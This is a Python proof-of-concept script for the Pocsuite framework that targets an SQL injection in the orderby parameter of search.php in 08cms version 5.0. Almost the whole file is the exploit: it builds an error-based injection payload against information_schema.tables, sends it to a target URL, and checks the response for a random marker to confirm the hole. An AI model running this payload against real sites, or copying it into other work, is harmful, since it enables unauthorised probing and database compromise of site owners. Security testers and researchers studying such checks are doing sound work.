#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    name = '08cms search SQL Injection'
    vulID = '0'
    author = ['LRestless']
    vulType = 'sql-inj'
    version = '1'
    references = ['http://www.hackdig.com/?10/hack-6295.htm']
    desc = '''08cms_v5.0  search.php的orderby存在注入'''

    vulDate = '2013-10-09'
    createDate = '2019-03-22'
    updateDate = '2019-03-22'

    appName = '08cms'
    appVersion = '5.0'
    appPowerLink = 'http://www.08cms.com/product'
    samples = ['re']

    def _attack(self):
        """attack mode"""
        return self._verify()

    def _verify(self):
        """verify  mode"""
        result = {}
        s = req.Session()
        s.get(self.url)
        self.url = self.url.strip('/') + '/search.php?chid=1&carsfullname=aa&searchmode=subject&orderby=aid'
        payload1 = '%20and%20(select%201%20from%20(select%20count(*),concat('
        paylaod2 = ',floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)&addno=0&ccid8=366'
        flag = "".join(random.choice(string.ascii_letters) for _ in xrange(0,8))
        flag = flag.lower()
        geturl = self.url + payload1 + flag + paylaod2
        resp = s.get(geturl)
        con = re.search(flag, resp.text)
        time.sleep(2)
        if con:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

